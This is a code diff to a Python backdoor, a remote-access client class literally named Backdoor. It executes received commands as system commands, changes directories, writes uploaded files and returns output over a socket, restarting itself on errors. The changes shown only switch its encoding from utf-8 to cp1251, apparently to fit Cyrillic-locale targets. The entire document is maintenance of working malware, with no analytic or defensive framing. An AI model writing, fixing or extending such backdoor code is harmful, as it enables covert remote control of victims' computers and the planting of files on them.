@@ -20,11 +20,11 @@ class Backdoor:
             return e.output
 
     def reliable_send(self, data):
-        json_data = json.dumps(data.decode("utf-8"))
-        self.connection.send(bytes(json_data, "utf-8"))
+        json_data = json.dumps(data.decode("cp1251"))
+        self.connection.send(bytes(json_data, "cp1251"))
 
     def reliable_receive(self):
-        json_data = bytes("", "utf-8")
+        json_data = bytes("", "cp1251")
         while True:
             try:
                 json_data += self.connection.recv(1024)
@@ -35,7 +35,7 @@ class Backdoor:
     @staticmethod
     def cd(path):
         os.chdir(path)
-        return bytes("WD -> " + path, "utf-8")
+        return bytes("WD -> " + path, "cp1251")
 
     @staticmethod
     def write_file(path, content):
@@ -64,12 +64,12 @@ class Backdoor:
                     self.reliable_send(command_result)
                 elif command[0] == "upload":
                     command_result = self.write_file(command[1], command[2])
-                    self.reliable_send(bytes(command_result, "utf-8"))
+                    self.reliable_send(bytes(command_result, "cp1251"))
                 else:
                     command_result = self.execute_system_command(command)
                     self.reliable_send(command_result)
         except Exception as e:
-            self.reliable_send(bytes(str(e), "utf-8"))
+            self.reliable_send(bytes(str(e), "cp1251"))
             self.run()
 
 try:
